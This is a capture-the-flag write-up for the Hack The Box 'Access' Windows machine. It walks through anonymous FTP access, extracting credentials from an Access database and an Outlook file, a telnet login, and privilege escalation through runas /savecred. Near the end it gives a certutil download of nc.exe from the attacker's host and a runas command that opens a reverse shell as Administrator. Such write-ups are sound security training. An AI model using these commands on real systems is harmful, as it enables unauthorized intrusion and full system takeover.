### Quick Summary 
#### Hey guys today Access retired and this is my write-up. I don't have too much to say about this box , It was a nice easy windows box and a good example of using `runas` in windows , Which is like `sudo` in linux and `doas` in openbsd (we used `doas` in [Ypuffy](/hack-the-box/ypuffy)). It's a windows box and its ip is 10.10.10.98 , I added it to `/etc/hosts` as `access.htb`

<hr>
### Nmap
#### As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC access.htb`
![](/images/hackthebox/access/1.png)
#### Nmap tells us that there's ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let's look at http first.
<br>
<hr>
### HTTP Enumeration 
#### We get this page titled as "MegaCorp" and it only has this image :
![](/images/hackthebox/access/2.png)
#### Sub directories enumeration with `gobuster` and `common.txt` (`/usr/share/wordlists/dirb/common.txt` in kali) only gave us 2 pages , `/aspnet_client` and `/index.html` 
![](/images/hackthebox/access/3.png)
#### `/aspnet_client` gave us `403` Forbidden :
![](/images/hackthebox/access/4.png)
#### And `/index.html` is of course the main page we saw earlier :
![](/images/hackthebox/access/5.png)
#### So now we know that http has nothing , Next thing to check is ftp
<br>
<hr>
### FTP Enumeration
#### Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories `Backups` and `Engineer`
![](/images/hackthebox/access/6.png)
#### In `Backups` there is only one file called `backup.mdb` , we will type `binary` to set the transfer mode to binary , so we won't get a corrupted file. Then `get backup.mdb` to download it :
![](/images/hackthebox/access/7.png)
#### And in `Engineer` there's a file called `Access Control.zip` :
![](/images/hackthebox/access/8.png)
<hr>
### Extracting credentials from backup.mdb and getting User
#### `backup.mdb` is a Microsoft Access Database , we can check using `file` :
![](/images/hackthebox/access/9.png)
#### We need mdbtools to deal with this database , it can be installed with `apt`
`apt-get install mdbtools`
#### We will use `mdb-tables` to get the table names : 
![](/images/hackthebox/access/10.png)
#### There's an interesting table named `auth_user` , We will use `mdb-export` to get the contents of that table :
`mdb-export backup.mdb auth_user`
![](/images/hackthebox/access/11.png)
#### And it gave us some credentials : 
`admin : admin`
<br>
<br>
`engineer : access4u@security`
<br>
<br>
`backup_admin : admin`
#### By looking at the other `zip` file we will find a file called `Access Control.pst` and it's a password protected file.
![](/images/hackthebox/access/12.png)
#### We already have 2 passwords : `admin` and `access4u@security`. `access4u@security` is the right password.
![](/images/hackthebox/access/13.png)
#### `Access Control.pst` is a Microsoft Outlook email folder : 
![](/images/hackthebox/access/14.png)
#### We can use a tool called `readpst` to be able to read the file :
`readpst Access\ Control.pst`
![](/images/hackthebox/access/15.png)
#### It will create another file called `Access Control.mbox` , Let's `cat` that file :
![](/images/hackthebox/access/16.png)
#### The very first thing we see is this email which has credentials for an account called `security` , password : `4CcessC0ntr0ller`
#### Let's `telnet` into the box with those credentials : 
`telnet access.htb`
![](/images/hackthebox/access/17.png)
#### And we owned user !
<br>

### runas and Privilege Escalation
#### As always we will start enumerating the filesystem , There are only 3 users on the box `Administrator` , `Public` and `security`.
![](/images/hackthebox/access/18.png)
#### We are in as `security` and we can't go into Administrator's directory so let's check Public.
#### In the Desktop of `Public` there's a `lnk` called `ZKAccess3.5 Security System`.
![](/images/hackthebox/access/19.png)
#### Let's `type` it and see what's inside it :
![](/images/hackthebox/access/20.png)
#### Of course not the best output , because it's a `lnk` file not a `txt` file , but we can read some stuff , and we notice that there's a `runas` command being excuted as administrator. `runas` allows us to run commands as another user and the option `/savecred` allows us to use the command without asking for password. Looking into Public's desktop is not necessary to know that, we can check by executing `net user administrator`
![](/images/hackthebox/access/21.png)
#### `Password required` is set to `No` , If this was set to `Yes` we wouldn't be able to use `runas` as administrator without knowing the password , However that `lnk` file on Public's desktop was a nice hint.
#### Now we can run a simple HTTP server on our box with python and host `nc.exe` : `python -m SimpleHTTPServer 80` `80` is the port number and it can be anything 
#### You can get `nc.exe` from github [here](https://github.com/diegocr/netcat/blob/master/nc.exe) , I also remember that I included another link in [SecNotes write-up](/hack-the-box/secnotes)
#### Then we will download it on the box :
`certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe`
![](/images/hackthebox/access/22.png)
#### After that we will set up our nc listener `nc -lvnp 1337` `1337` is the port number and it can be anything.
#### Finally we will use `runas` to get a reverse shell :
`runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.xx.xx 1337"`
![](/images/hackthebox/access/23.png)
#### Let's check our listener :
![](/images/hackthebox/access/24.png)
#### We have a shell.
![](/images/hackthebox/access/25.png)
#### And we owned root !
